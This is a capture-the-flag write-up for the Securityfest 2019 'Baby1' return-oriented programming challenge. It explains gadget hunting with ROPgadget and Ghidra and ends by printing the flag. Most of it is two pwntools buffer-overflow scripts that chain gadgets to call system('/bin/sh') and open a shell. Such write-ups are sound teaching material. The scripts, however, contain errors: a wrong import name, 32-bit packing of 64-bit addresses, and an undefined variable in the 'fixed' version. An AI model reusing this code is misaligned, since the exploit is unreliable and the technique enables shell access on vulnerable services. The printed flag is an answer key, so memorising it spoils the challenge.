# Securityfest 2019 "Baby1"

Writeup by Ben Taylor

## Solution

It's given that this problem is a [return oriented programming](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/) problem. In other words, way out of my web & crypto bubble of comfort. Let's dig in.

As with any problem where we are given an executable, the first thing I usually recommend is to quickly look through all of the strings. On Linux and macOS, you can do this by using [`strings`](https://linux.die.net/man/1/strings). On Windows, first uninstall windows, then install linux, and see the previous sentence. While it's not as easy as just plucking out a flag from the strings, we do see a `"/bin/sh"` string, which makes me think that the problem will be similar to BabyROP from Harekaze's 2019 CTF.

Since this is an ROP problem, it would be smart to find a few ROP gadgets using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). We find a `pop rdi; ret` gadget at `0x00400793`. As we'll see later, we'll also need `ret` at `0x0040053e`.

After looking over the strings and grabbing the ROP gadgets, we can decompile and disassemble the binary using [Ghidra](https://www.ghidra-sre.org/). If you've never used Ghidra before, it can be a little intimidating, but it's a really powerful tool for reverse engineering and ROP problems. We find `system` at `0x00400560` and `"/bin/sh"` at `0x400286`. Finally, we see that our string is at Stack[-0x18], which means we need to feed it 24 characters of garbage to get to where we need to on the stack.

So our payload should look something like "A" * 24 + pop_gadget + shell + system. Using [PwnTools](http://docs.pwntools.com/en/stable/) and Python, we get the following program:

``` Python
from pwntools import *

shell      = p32(0x00400286);
system     = p32(0x00400560);
pop_gadget = p32(0x00400793);

payload = "A" * 24 + pop_gadget + shell + system;

conn = remote('127.0.0.1', 0000) # ip & port redacted
conn.send(payload);
conn.interactive();
```

However, running this program results in a seg fault. This is because Ubuntu's libc uses [SSE registers](https://en.wikibooks.org/wiki/X86_Assembly/SSE), so our payload is misaligned. This is where our extra `ret` is useful. By putting `ret` right after our 24 characters of garbage, we align the payload and get the flag. Here's the revised program:

``` Python
from pwntools import *

shell      = p32(0x00400286);
system     = p32(0x00400560);
pop_gadget = p32(0x00400793);
ret_gadget = p32(0x0040053e);

payload = "A" * 24 + ret + pop_gadget + shell + system;

conn = remote('127.0.0.1', 0000) # ip & port redacted
conn.send(payload);
conn.interactive();
```

This gives us a shell where we can easily find the flag.

Flag: `sctf{1.p0p_r3GIs73rS_2.pOp_5H3lL_3.????_4.pr0FiT}`
